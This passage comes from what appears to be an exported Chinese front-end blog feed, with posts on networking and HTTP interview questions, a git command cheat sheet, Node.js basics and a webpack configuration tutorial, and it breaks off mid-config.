客户端已经没有疑问了，服务器也确认刚刚客户端收到了自己的数据包。两边都没有问题，开始通信。为什么要三次握手：为了防止已失效的连接请求报文段突然又传送到了服务端，因而产生错误。也防止了服务器端的一直等待而浪费资源; TCP作为一种可靠传输控制协议，其核心思想：既要保证数据可靠传输，又要提高传输的效率，而用三次恰恰可以满足以上两方面的需求！四次挥手主机向服务器发送一个断开连接的请求（ 不早了，我该走了 ）,发送一个FIN报文段； 服务器接到请求后发送确认收到请求的信号（ 知道了 ）回一个ACK报文段； 服务器向主机发送断开通知（ 我也该走了 ）发送FIN报文段，请求关闭连接； 主机接到断开通知后断开连接并反馈一个确认信号（ 嗯，好的 ），服务器收到确认信号后也断开连接；TCP和UDP的区别TCP（Transmission Control Protocol，传输控制协议）是基于连接的协议，也就是说，在正式收发数据前，必须和对方建立可靠的连接。一个TCP连接必须要经过三次“对话”才能建立起来。UDP（User Data Protocol，用户数据报协议）是与TCP相对应的协议。它是面向非连接的协议，它不与对方建立连接，而是直接就把数据包发送过去！UDP适用于一次只传送少量数据、对可靠性要求不高的应用环境。HTTP和HTTPSHTTP协议通常承载于TCP协议之上，在HTTP和TCP之间添加一个安全协议层（SSL或TSL），这个时候，就成了我们常说的HTTPS 默认HTTP的端口号为80，HTTPS的端口号为443 HTTPS 相对于 HTTP 性能上差点，因为多了 SSL/TLS 的几次握手和加密解密的运算处理，但是加密解密的运算处理已经可以通过特有的硬件来加速处理。什么是Etag？把Last-Modified和ETag请求的http报头一起使用，可利用客户端（例如浏览器）的缓存。ETag用于标识资源的状态，当资源发生变更时，如果其头信息中一个或者多个发生变化，或者消息实体发生变化，那么ETag也随之发生变化。浏览器下载组件的时候，会将它们存储到浏览器缓存中。如果需要再次获取相同的组件，浏览器将检查组件的缓存时间，假如已经过期，那么浏览器将发送一个条件GET请求到服务器，服务器判断缓存还有效，则发送一个304响应，告诉浏览器可以重用缓存组件。Expires和Cache-ControlExpires 用来控制缓存的失效日期 Cache-Control 用来控制网页的缓存 常见的取值有private、no-cache、max-age、must-revalidate等，默认为private。关于Http 2.0 你知道多少HTTP/2引入了“服务端推（server push）”的概念，它允许服务端在客户端需要数据之前就主动地将数据发送到客户端缓存中，从而提高性能。 HTTP/2提供更多的加密支持 HTTP/2使用多路技术，允许多个消息在一个连接上同时交差。 它增加了头压缩（header compression），因此即使非常小的请求，其请求和响应的header都只会占用很小比例的带宽。一个页面从输入 URL 到页面加载显示完成，这个过程中都发生了什么？ 浏览器根据请求的URL交给DNS域名反解析，找到真实IP，向服务器发起请求（TCP三次握手）； 服务器交给后台处理完成后返回数据，浏览器接收文件（HTML、JS、CSS、图象等）； 浏览器对加载到的资源（HTML、JS、CSS等）进行语法解析，建立相应的内部数据结构（如HTML的DOM）； 载入解析到的资源文件，渲染页面，完成。浏览器的渲染过程浏览器请求到HTML代码后，在生成DOM的最开始阶段，并行发起css、图片、js的请求，无论他们是否在HEAD里。浏览器会将HTML解析成一个DOM树，DOM 树的构建过程是一个深度遍历过程：当前节点的所有子节点都构建好后才会去构建当前节点的下一个兄弟节点。 CSS文件下载完成，开始构建CSSOM 所有CSS文件下载完成，CSSOM构建结束后，和 DOM 一起生成 Render Tree。 有了Render Tree，浏览器已经能知道网页中有哪些节点、各个节点的CSS定义以及他们的从属关系。下一步操作就是计算出每个节点在屏幕中的位置。 最后一步，按照算出来的规则，把内容渲染到屏幕上。 以上五个步骤前3个步骤因为DOM、CSSOM、Render Tree都可能在第一次Painting后又被更新多次，比如JS修改了DOM或者CSS属性。Layout 和 Painting 也会被重复执行，除了DOM、CSSOM更新的原因外，图片下载完成后也需要调用Layout 和 Painting来更新网页。display:none 的节点不会被加入 Render Tree，而 visibility: hidden 则会，所以，如果某个节点最开始是不显示的，设为 display:none 是更优的。 一个完整的URL包括以下几部分 协议部分 域名部分 端口部分 虚拟目录部分：从域名后的第一个“/”开始到最后一个“/”为止 文件名部分：从域名后的最后一个“/”开始到“？”为止 参数部分：从“？”开始到“#”为止之间的部分 锚部分：从“#”开始到最后GET和POST的区别 GET：一般用于信息获取，使用URL传递参数，对所发送信息的数量也有限制，一般在1024字节，Get是通过地址栏来传值。 POST：一般用于修改服务器上的资源，对所发送的信息没有限制。（常用于发送表单数据，新建、修改等），Post是通过提交表单来传值。 常见HTTP状态码 1xx（临时响应）:表示临时响应并需要请求者继续执行操作的状态码。 - 2xx（成功）:表示成功处理了请求的状态码。 200（成功）：服务器已成功处理了请求。通常，这表示服务器提供了请求的网页。 3xx（重定向）：要完成请求，需要进一步操作。 301（永久移动）：请求的网页已永久移动到新位置。 302（临时移动）：服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来响应以后的请求。 304（未修改）：自从上次请求后，请求的网页未修改过。 4xx（请求错误）：这些状态码表示请求可能出错，妨碍了服务器的处理。 400（错误请求）：服务器不理解请求的语法。 404（未找到）：服务器找不到请求的网页。 5xx（服务器错误）:这些状态码表示服务器在处理请求时发生内部错误。 500（服务器内部错误）：服务器遇到错误，无法完成请求。 503（服务不可用）：服务器目前无法使用（由于超载或停机维护）。说说网络分层里七层模型是哪七层 应用层 表示层 会话层（从上往下）（HTTP、FTP、SMTP、DNS） 传输层（TCP和UDP） 网络层（IP） 物理层 数据链路层（以太网） 304缓存服务器首先产生ETag，服务器可在稍后使用它来判断页面是否已经被修改。本质上，客户端通过将该记号传回服务器要求服务器验证其（客户端）缓存。304是HTTP状态码，服务器用来标识这个文件没修改，不返回内容，浏览器在接收到个状态码后，会使用浏览器已缓存的文件http keep-alive与tcpkeep-alive http keep-alive是为了让tcp活得更久一点，以便在同一个连接上传送多个http，提高socket的效率。而tcp keep-alive是TCP的一种检测TCP连接状况的保鲜机制。常见web安全及防护原理 sql注入原理 就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。 XSS 指的是攻击者往Web页面里插入恶意html标签或者javascript代码。比如：攻击者在论坛中放一个看似安全的链接，骗取用户点击后，窃取cookie中的用户私密信息；或者攻击者在论坛中加一个恶意表单，当用户提交表单的时候，却把信息传送到攻击者的服务器中，而不是用户原本以为的信任站点。 CSRF CSRF是代替用户完成指定的动作，需要知道其他用户页面的代码和数据包。要完成一次CSRF攻击，受害者必须依次完成两个步骤：1、登录受信任网站A，并在本地生成Cookie。2、在不登出A的情况下，访问危险网站B。算法数组去重 建一个空对象和空数组，循环遍历需要去重的数组，判断对象有没有此属性，没有的话就给对象添加此属性，并向空数组中push这个值。 1234567//es5 function unique(arr)&#123; var obj = &#123;&#125; var result = [] for(var i in arr)&#123; if(!obj[arr[i]])&#123; obj[arr[i]] = true; result.push(arr[i]); &#125;&#125; return result; &#125;//es6 [...new Set(arr)] 排序其他对前端界面工程师这个职位是怎么样理解的?前端是最贴近用户的程序员，前端的能力就是能让产品从 90分进化到 100 分，甚至更好实现界面交互 提升用户体验 谈谈你对重构的理解在不改变外部行为的前提下，简化结构、添加可读性，而在网站前端保持一致的行为。也就是说是在不改变UI的情况下，对网站进行优化，在扩展的同时保持一致的UI。减少代码间的耦合 让代码保持弹性 严格按规范编写代码 设计可扩展的API 代替旧有的框架、语言(如VB) 增强用户体验 通常来说对于速度的优化也包含在重构中 你遇到过比较难的技术问题是？你是如何解决的？平时是如何学习前端开发的？平时如何管理你的项目？ 先期团队必须确定好全局样式（globe.css），编码模式(utf-8) 等； 编写习惯必须一致（例如都是采用继承式的写法，单样式都写成一行 标注样式编写人，各模块都及时标注（标注关键样式调用的地方）； 页面进行标注（例如 页面 模块 开始和结束）； CSS跟HTML 分文件夹并行存放，命名都得统一（例如style.css）； JS 分文件夹存放 命名以该JS功能为准的英文翻译。 图片采用整合的 images.png png8 格式文件使用尽量整合在一起使用方便将来的管理]]></content>
      <categories>
        <category>前端 面试题</category>
      </categories>
      <tags>
        <tag>面试题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS中的事件循环机制、调用栈以及任务队列]]></title>
    <url>%2F2018%2F08%2F21%2FJS%E4%B8%AD%E7%9A%84%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E3%80%81%E8%B0%83%E7%94%A8%E6%A0%88%E4%BB%A5%E5%8F%8A%E4%BB%BB%E5%8A%A1%E9%98%9F%E5%88%97%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[8种方式实现跨域请求]]></title>
    <url>%2F2018%2F08%2F19%2F8%E7%A7%8D%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[ajax请求方式post和get的区别]]></title>
    <url>%2F2018%2F08%2F19%2Fajax%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8Fpost%E5%92%8Cget%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[本文总阅读量次]]></content>
  </entry>
  <entry>
    <title><![CDATA[node基础2]]></title>
    <url>%2F2018%2F08%2F19%2Fnode%E5%9F%BA%E7%A1%802%2F</url>
    <content type="text"><![CDATA[本文总阅读量次]]></content>
      <categories>
        <category>后端</category>
        <category>node</category>
      </categories>
      <tags>
        <tag>node</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git常用命令清单]]></title>
    <url>%2F2018%2F08%2F18%2Fgit%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B8%85%E5%8D%95%2F</url>
    <content type="text"><![CDATA[本文总阅读量次Git有几十上百个命令，但是我们经常用到的也就那么几个基本的,要想真正熟练，还要记住更多的命令。下面基于常用的命令做一下总结。 Workspace：工作区 Index / Stage：暂存区 Repository：仓库区（或本地仓库） Remote：远程仓库 一、新建代码库12345678在当前目录新建一个Git代码库git init新建一个目录，将其初始化为Git代码库git init [project-name]下载一个项目和它的整个代码历史git clone [url] 二、配置Git的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。 123456789显示当前的Git配置git config --list编辑Git配置文件git config -e [--global]设置提交代码时的用户信息git config [--global] user.name "[name]"git config [--global] user.email "[email address]" 三、增加/删除文件123456789101112131415161718192021添加指定文件到暂存区git add [file1] [file2] ...添加指定目录到暂存区，包括子目录git add [dir]添加当前目录的所有文件到暂存区git add .添加每个变化前，都会要求确认对于同一个文件的多处变化，可以实现分次提交git add -p删除工作区文件，并且将这次删除放入暂存区git rm [file1] [file2] ...停止追踪指定文件，但该文件会保留在工作区git rm --cached [file]改名文件，并且将这个改名放入暂存区git mv [file-original] [file-renamed] 四、代码提交123456789101112131415161718提交暂存区到仓库区git commit -m [message]提交暂存区的指定文件到仓库区git commit [file1] [file2] ... -m [message]提交工作区自上次commit之后的变化，直接到仓库区git commit -a提交时显示所有diff信息git commit -v使用一次新的commit，替代上一次提交如果代码没有任何新变化，则用来改写上一次commit的提交信息git commit --amend -m [message]重做上一次commit，并包括指定文件的新变化git commit --amend [file1] [file2] ... 五、分支123456789101112131415161718192021222324252627282930313233343536373839404142列出所有本地分支git branch列出所有远程分支git branch -r列出所有本地分支和远程分支git branch -a新建一个分支，但依然停留在当前分支git branch [branch-name]新建一个分支，并切换到该分支git checkout -b [branch]新建一个分支，指向指定commitgit branch [branch] [commit]新建一个分支，与指定的远程分支建立追踪关系git branch --track [branch] [remote-branch]切换到指定分支，并更新工作区git checkout [branch-name]切换到上一个分支git checkout -建立追踪关系，在现有分支与指定的远程分支之间git branch --set-upstream [branch] [remote-branch]合并指定分支到当前分支git merge [branch]选择一个commit，合并进当前分支git cherry-pick [commit]删除分支git branch -d [branch-name]删除远程分支git push origin --delete [branch-name]git branch -dr [remote/branch] 六、标签1234567891011121314151617181920212223242526列出所有taggit tag新建一个tag在当前commitgit tag [tag]新建一个tag在指定commitgit tag [tag] [commit]删除本地taggit tag -d [tag]删除远程taggit push origin :refs/tags/[tagName]查看tag信息git show [tag]提交指定taggit push [remote] [tag]提交所有taggit push [remote] --tags新建一个分支，指向某个taggit checkout -b [branch] [tag] 七、查看信息1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889显示有变更的文件git status显示当前分支的版本历史git log单行显示分支提交历史git log --oneline --decorate --graph --all显示commit历史，以及每次commit发生变更的文件git log --stat搜索提交历史，根据关键词git log -S [keyword]显示某个commit之后的所有变动，每个commit占据一行git log [tag] HEAD --pretty=format:%s显示某个commit之后的所有变动，其"提交说明"必须符合搜索条件git log [tag] HEAD --grep feature显示某个文件的版本历史，包括文件改名git log --follow [file]git whatchanged [file]显示指定文件相关的每一次diffgit log -p [file]显示过去5次提交git log -5 --pretty --oneline显示所有提交过的用户，按提交次数排序git shortlog -sn显示指定文件是什么人在什么时间修改过git blame [file]显示暂存区和工作区的差异git diff显示暂存区和上一个commit的差异git diff --cached [file]显示工作区与当前分支最新commit之间的差异git diff HEAD显示两次提交之间的差异git diff [first-branch]...[second-branch]显示今天你写了多少行代码git diff --shortstat "@&#123;0 day ago&#125;"显示某次提交的元数据和内容变化git show [commit]显示某次提交发生变化的文件git show --name-only [commit]显示某次提交时，某个文件的内容git show [commit]:[filename]显示当前分支的最近几次提交git reflog``` # 八、远程同步```javascript下载远程仓库的所有变动git fetch [remote]显示所有远程仓库git remote -v显示某个远程仓库的信息git remote show [remote]增加一个新的远程仓库，并命名git remote add [shortname] [url]取回远程仓库的变化，并与本地分支合并git pull [remote] [branch]上传本地指定分支到远程仓库git push [remote] [branch]强行推送当前分支到远程仓库，即使有冲突git push [remote] --force推送所有分支到远程仓库git push [remote] --all 九、撤销12345678910111213141516171819202122232425262728293031恢复暂存区的指定文件到工作区git checkout [file]恢复某个commit的指定文件到暂存区和工作区git checkout [commit] [file]恢复暂存区的所有文件到工作区git checkout .重置暂存区的指定文件，与上一次commit保持一致，但工作区不变git reset [file]重置暂存区与工作区，与上一次commit保持一致git reset --hard重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变git reset [commit]重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致git reset --hard [commit]重置当前HEAD为指定commit，但保持暂存区和工作区不变git reset --keep [commit]新建一个commit，用来撤销指定commit后者的所有变化都将被前者抵消，并且应用到当前分支git revert [commit]暂时将未提交的变化移除，稍后再移入git stashgit stash pop 十、其他12生成一个可供发布的压缩包git archive]]></content>
      <categories>
        <category>git&amp;github</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ECharts使用过程遇到的问题汇总]]></title>
    <url>%2F2018%2F08%2F18%2FECharts%E4%BD%BF%E7%94%A8%E8%BF%87%E7%A8%8B%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[本文总阅读量次 获取ECharts npm install echarts –save 自定义构建ECharts我选用的是常用版的echarts/dist/echarts.common.js在我的项目根目录下myProject新建echarts.common.js，然后将echarts.common.js压缩到lib下的压缩文件echarts.common.min.js时遇到一点问题首先是各种包没有安装，就依次安装就好其次是出现如下错误： TypeError: uglifyPlugin is not a function 我采用的是安装webpack，可能需要打包工具，然后是rollup-plugin-uglify版本太高，重新安装rollup-plugin-uglify@3.0.0，再重新安装就可以了]]></content>
      <categories>
        <category>前端 ECharts</category>
      </categories>
      <tags>
        <tag>ECharts</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[node的REPL]]></title>
    <url>%2F2018%2F08%2F17%2Fnode%E7%9A%84REPL%2F</url>
    <content type="text"><![CDATA[本文总阅读量次 REPL (read eval print loop)在Node.js中为了使开发者方便测试JavaScript代码，提供了一个名为REPL的可交互式运行环境。开发者可以在该运行环境中输入任何JavaScript表达式，当用户按下回车键后，REPL运行环境将显示该表达式的运行结果。 如何进入REPL在DOS命令行输入node,回车就进入了node的REPL命令行 REPL操作 变量的操作，声明普通变量和对象 eval 函数的书写 下划线访问最近使用的表达式 多行书写 REPL运行华宁中的上下文环境 123456let repl = require('repl');let con = repl.start().context;con.msg = 'hello';con.hello = function()&#123;console.log(con.msg);&#125; REPL运行环境的基础命令 .break 退出当前命令 .clear 清除REPL运行环境上下文对象中保存的所有变量与函数 .exit 退出REPL运行环境 .save 把输入的所有表达式保存到一个文件中 .load 把所有的表达式加载到REPL运行环境中 .help 查看帮助命令]]></content>
      <categories>
        <category>后端</category>
        <category>node</category>
      </categories>
      <tags>
        <tag>node</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[node基础]]></title>
    <url>%2F2018%2F08%2F17%2Fnode%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[本文总阅读量次 node的基本概念node能够解决什么问题？ node的首要目标是提供一种简单的，用于创建高性能的服务器的开发工具 web服务器的瓶颈在于并发的用户量，对比Java和PHP的实现方式 node是什么？ node.js是一个基于Chrome V8引擎的JavaScript运行环境，让JavaScript的执行效率与低端的C语言的相近的执行效率 node.js使用了一个事件驱动、非阻塞式I/O的模型，使其轻量又高效 node.js的包管理器npm，是全球最大的开源生态系统 node的特点为什么JavaScript是单线程的 这是由JavaScript这门脚本语言的用途决定的 Web Worker并没用改变JavaScript单线程的本质 浏览器模型 用户界面包括地址栏、前进/后退按钮、书签菜单等 浏览器引擎-在用户界面和呈现引擎之间传送指令 呈现引擎-又称渲染引擎，也被称为浏览器内核，在线程方面又称为UI线程 网络-用于网络调用，比如http请求 用户界面后端-用于绘制基本的窗口小部件，UI线程和JS共用一个线程 JavaScript解释器-用于解析和执行JavaScript代码 数据存储-这是持久层。浏览器需要在硬盘上保存各种数据，例如Cookie Webworker 是多线程的 完全受主线程控制 不能操作DOM 除JS线程和UI线程之外的其他线程任务队列Event Loop(事件循环)123456789101112131415function read()&#123; console.log(1); setTimeout(function()&#123; console.log(2); setTimeout(function()&#123; console.log(4); &#125;,1000) &#125;,1000);//放到事件队列里 setTimeout(function()&#123; console.log(5); &#125;,1000) console.log(3);&#125;read();//依次打印1 3 2 5 4//JS引擎会先执行栈中的任务，再执行回调队列中的回调事件（先进先出） 1234567891011121314151617function next()&#123;console.log(1);setTimrout(function()&#123;console.log(2);&#125;);//nextTick是把这个回调函数当在当前执行栈的尾部process.nextTick(function()&#123;console.log(3);process.nextTick(function()&#123;console.log(4);process.nextTick(function()&#123;console.log(5);&#125;)// 1 3 4 5 2 &#125;)&#125;)&#125;next();//1 3 4 5 2 node.js中的Event Loop V8引擎解析JavaScript脚本 解析后的代码，调用node API libuv库负责node API的执行，它将不同的任务分配给不同的线程，形成一个Event Loop(事件环)，以异步的方式将任务的执行结果返回给V8引擎 V8引擎再将结果返回给用户 同步与异步同步和异步关注的是消息通知机制 同步就是发出调用后，没有得到结果之前，该调用不返回，一旦返回，就得到返回值了，简而言之就是调用者主动等待这个调用的结果 异步则相反，调用者在发出后这个调用就直接返回了，所以没有返回结果。换句话说当一个异步过程调用发出后，调用者不会立刻得到结果，而是调用发出后，被调用者通过状态、通知或回调函数处理这个调用。 阻塞与非阻塞阻塞和非阻塞关注的是等待结果时的状态 阻塞调用是指调用结果返回之前，当前线程会被挂起。调用线程只有在得到结果之后才会返回。 非阻塞调用指在不能立刻得到结果之前，该调用不会阻塞当前线程。 同步异步与阻塞非阻塞的区别同步异步取决于被调用者，阻塞非阻塞取决于调用者被调用者决定的是同步还是异步调用者决定是阻塞还是非阻塞调用者在等待的过程中不干别的，那就是调用者被阻塞了调用者在等待的过程中干别的，那就是调用者不被阻塞 同异步与阻塞非阻塞的组合关系 同步阻塞 被调用者立即告诉调用者是同步的，这个等待过程中调用者不干别的，就是调用者被阻塞了。 同步非阻塞 被调用者立即告诉调用者是同步的，这个等待过程中调用者接着干其他的，主线程不受干扰，就是调用者不被阻塞。 异步阻塞 被调用者是异步的，但是这个等待过程中调用者不干别的，就调用者被阻塞了。这是异步阻塞 异步非阻塞 被调用者是异步的，这个等待的过程中调用者接着干其他的事情，主线程不受干扰，调用者不被阻塞，这就是异步非阻塞。 什么场景下应该考虑使用node框架当应用程序需要处理大量并发的输入输出，而在向客户端响应之前，应用程序并不需要进行非常复杂的处理。 聊天服务器 电子商务网站]]></content>
      <categories>
        <category>node</category>
        <category>后端</category>
      </categories>
      <tags>
        <tag>node</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[webpack基础]]></title>
    <url>%2F2018%2F08%2F17%2Fwebpack%2F</url>
    <content type="text"><![CDATA[本文总阅读量次 什么是webpack?WebPack可以看做是模块打包机：它做的事情是，分析你的项目结构，找到JavaScript模块以及其它的一些浏览器不能直接运行的拓展语言（Scss，TypeScript等），并将其打包为合适的格式以供浏览器使用。 构建就是把源代码转换成发布到线上的可执行 JavaScrip、CSS、HTML 代码，包括如下内容。 代码转换: TypeScript 编译成 JavaScript、SCSS 编译成 CSS 等。 文件优化: 压缩 JavaScript、CSS、HTML 代码，压缩合并图片等。 代码分割: 提取多个页面的公共代码、提取首屏不需要执行部分的代码让其异步加载。 模块合并: 在采用模块化的项目里会有很多个模块和文件，需要构建功能把模块分类合并成一个文件。 自动刷新: 监听本地源代码的变化，自动重新构建、刷新浏览器。 代码校验: 在代码被提交到仓库前需要校验代码是否符合规范，以及单元测试是否通过。 自动发布: 更新完代码后，自动构建出线上发布代码并传输给发布系统。 构建其实是工程化、自动化思想在前端开发中的体现，把一系列流程用代码去实现，让代码自动化地执行这一系列复杂的流程。 构建给前端开发注入了更大的活力，解放了我们的生产力。 初始化项目123mkdir webpack-publiccd webpack-publicnpm init -y 以上三条命令分别是：创建文件夹并命名为webpack-public，将文件夹添加进路径中，初始化npm。 注意：在创建文件夹的时候，名字不能是webpack，否在在安装webpack的时候会报错。 错误信息： npm ERR! code ENOSELFnpm ERR! Refusing to install package with name “webpack” under a packagenpm ERR! also called “webpack”. Did you name your project the samenpm ERR! as the dependency you’re installing?npm ERR!npm ERR! For more information, see:npm ERR! https://docs.npmjs.com/cli/install#limitations-of-npms-install-algorithm webpack核心知识webpack的核心概念 Entry:入口，Webpack 执行构建的第一步将从 Entry 开始，可抽象成输入。 Module：模块，在 Webpack 里一切皆模块，一个模块对应着一个文件。Webpack 会从配置的 Entry 开始递归找出所有依赖的模块。 Chunk：代码块，一个 Chunk 由多个模块组合而成，用于代码合并与分割。 Loader：模块转换器，用于把模块原内容按照需求转换成新内容。 Plugin：扩展插件，在 Webpack 构建流程中的特定时机注入扩展逻辑来改变构建结果或做你想要的事情。 Output：输出结果，在 Webpack 经过一系列处理并得出最终想要的代码后输出结果。 Webpack 启动后会从Entry里配置的Module开始递归解析 Entry 依赖的所有 Module。 每找到一个 Module， 就会根据配置的Loader去找出对应的转换规则，对 Module 进行转换后，再解析出当前 Module 依赖的 Module。 这些模块会以 Entry 为单位进行分组，一个 Entry 和其所有依赖的 Module 被分到一个组也就是一个 Chunk。最后 Webpack 会把所有 Chunk 转换成文件输出。 在整个流程中 Webpack 会在恰当的时机执行 Plugin 里定义的逻辑。 配置webpack npm install webpack webpack-cli -D在开发环境中安装webpack webpack-cli 创建src目录 mkdir src 创建dist目录 mkdir dist 基本配置文件创建dist目录下的index.html12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="root"&gt;&lt;/div&gt; &lt;script src="bundle.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 配置文件webpack.config.js entry：配置入口文件的地址 output：配置出口文件的地址 module：配置模块,主要用来配置不同文件的加载器 plugins：配置插件 devServer：配置开发服务器 1234567891011const path=require('path');module.exports=&#123; entry: './src/index.js', output: &#123; path: path.resolve(__dirname,'dist'), filename:'bundle.js' &#125;, module: &#123;&#125;, plugins: [], devServer: &#123;&#125;&#125; 配置开发服务器 npm install webpack-dev-server -D 尽量不要简写install为i,有可能会报这个错误12345npm ERR! code EINVALIDTAGNAMEnpm ERR! Invalid tag name "–D": Tags may not have any characters that encodeURIComponent encodes.npm ERR! A complete log of this run can be found in:npm ERR! C:\Users\User\AppData\Roaming\npm-cache\_logs\2018-08-17T03_07_44_727Z-debug.log 在webpack.config.js文件中，找到devServer添加如下内容 123456devServer: &#123; contentBase: path.resolve(__dirname, 'dist'), host: 'localhost', compress: true, port: 8080 &#125; contentBase:配置开发服务运行时的文件根目录 host：开发服务器监听的主机地址 compress: 开发服务器是否启动gzip等压缩 port：开发服务器监听的端口在pack.json中找到scripts添加如下内容 1234"scripts": &#123; "build": "webpack --mode development", "dev": "webpack-dev-server --open --mode development " &#125; 支持加载CSS文件什么是Loader通过使用不同的loader，Webpack可以把不同的文件都转成js文件。比如CSS、ES6/7、JSX等 test：匹配处理文件的扩展名的正则表达式 use：loader名称，就是你要使用模块的名称 include/exclude:手动指定必须处理的文件夹或屏蔽不需要处理的文件夹 query：为loaders提供额外的设置选项 loader的三种写法loader加载CSS文件，CSS文件有可能在node_modules里，比如bootstrap、antd 12345678module: &#123; rules: [ &#123; test: /\.css/, loader:['style-loader','css-loader'] &#125; ] &#125; use12345678module: &#123; rules: [ &#123; test: /\.css/, use:['style-loader','css-loader'] &#125; ] &#125;, use+loader123456789101112131415module: &#123; rules: [ &#123; test: /\.css/, include: path.resolve(__dirname,'src'), exclude: /node_modules/, use: [&#123; loader: 'style-loader', options: &#123; insertAt:'top' &#125; &#125;,'css-loader'] &#125; ] &#125; 插件 在 webpack的构建流程中，plugin用于处理更多其他的一些构建任务 模块代码转换的工作由 loader 来处理 除此之外的其他任何工作都可以交由 plugin 来完成 自动产出html安装插件自动产出HTML文件，并在里面引入产出后的资源 npm install html-webpack-plugin -D ps:如果报一下错误123npm ERR! code EAI_AGAINnpm ERR! errno EAI_AGAINnpm ERR! request to https://registry.npmjs.org/html-webpack-plugin failed, reason: getaddrinfo EAI_AGAIN registry.npmjs.org registry.npmjs.org:443 则可以通过以下方法进行解决：切换淘宝镜像 通过config命令 npm config set registry https://registry.npm.taobao.org npm info underscore （如果上面配置正确这个命令会有字符串response） 命令行指定 npm –registry https://registry.npm.taobao.org info underscore 执行完成之后，再执行以上命令就可以了，亲测有效 配置webpack.config.js下的plugins123456789plugins: [ new HtmlWebpackPlugin(&#123; minify: &#123; removeAttributeQuotes:true &#125;, hash: true, template: './src/index.html', filename:'index.html'&#125;)] minify是对html文件进行压缩，removeAttrubuteQuotes是去掉属性的双引号 hash 引入产出资源的时候加上查询参数，值为哈希避免缓存 template 模版路径 支持图片手动添加图片 npm install file-loader url-loader -D file-loader 解决CSS等文件中的引入图片路径问题 url-loader 当图片小于limit的时候会把图片BASE64编码，大于limit参数的时候还是使用file-loader 进行拷贝 JS中引入图片JS1234let logo=require('./images/logo.png');let img=new Image();img.src=logo;document.body.appendChild(img); 配置webpack.config.js123456789&#123; test:/\.(jpg|png|bmp|gif|svg|ttf|woff|woff2|eot)/, use:[ &#123; loader:'url-loader', options:&#123;limit:4096&#125; &#125; ]&#125; 在CSS中引入图片CSS123456.logo&#123; width:355px; height:133px; background-image: url(./images/logo.png); background-size: cover;&#125; HTML1&lt;div class="logo"&gt;&lt;/div&gt; 分离CSS因为CSS的下载和JS可以并行，当一个HTML文件很大的时候，我们可以把CSS单独提取出来加载 mini-css-extract-plugin filename 打包入口文件 chunkFilename用来打包import(‘module’)方法中引入的模块安装依赖模块 npm install –save-dev mini-css-extract-plugin 配置webpack.config.js 123456789101112131415plugins: [ //参数类似于webpackOptions.output new MiniCssExtractPlugin(&#123; filename: '[name].css', chunkFilename:'[id].css' &#125;),&#123; test: /\.css/, include: path.resolve(__dirname,'src'), exclude: /node_modules/, use: [&#123; loader: MiniCssExtractPlugin.loader &#125;,'css-loader']&#125; 压缩CSS和JS uglifyjs-webpack-plugin optimize-css-assets-webpack-plugin安装依赖 npm install uglifyjs-webpack-plugin -Dnpm install optimize-css-assets-webpack-plugin -D 123456789101112const UglifyJSplugin=require('uglifyjs-webpack-plugin');+ const OptimizeCssAssetsWebpackPlugin = require('optimize-css-assets-webpack-plugin');optimization: &#123; minimizer: [ new UglifyJSplugin(&#123; cache: true,//启用缓存 parallel: true,// 使用多进程运行改进编译速度 sourceMap:true//生成sourceMap映射文件 &#125;), new OptimizeCssAssetsWebpackPlugin(&#123;&#125;) ] &#125; CSS和image存放单独目录 outputPath 输出路径 publicPath指定的是构建后在html里的路径 123456789101112131415161718192021222324output: &#123; path: path.resolve(__dirname,'dist'), filename: 'bundle.js', publicPath:'/' &#125;,&#123; test:/\.(jpg|jpeg|png|bmp|gif|svg|ttf|woff|woff2|eot)/, use:[ &#123; loader:'url-loader', options:&#123; limit: 4096, outputPath: 'images', publicPath:'/images' &#125; &#125; ]&#125;plugins: [ new MiniCssExtractPlugin(&#123; filename: 'css/[name].css', chunkFilename:'css/[id].css' &#125;), 在HTML中使用图片 npm install html-withimg-loader -D index.html文件中 在webpack.config.js文件中添加如下配置1234&#123; test: /\.(html|htm)$/, use: 'html-withimg-loader'&#125; 编译less和sass安装less npm install less less-loader -Dnpm install node-saas sass-loader -D 如果在安装sass中出现如下错误 12npm ERR! code E404npm ERR! 404 Not Found: node-saas@latest 可以尝试一下操作我切换到了cnpm上安装就可以了，我也不明白什么原因 写样式less1234@color:orange;.less-container&#123; color:@color;&#125; sass1234$color:green;.sass-container&#123; color:green;&#125; wepack.config.js12345678910111213141516&#123; test: /\.less/, include: path.resolve(__dirname,'src'), exclude: /node_modules/, use: [&#123; loader: MiniCssExtractPlugin.loader, &#125;,'css-loader','less-loader'] &#125;, &#123; test: 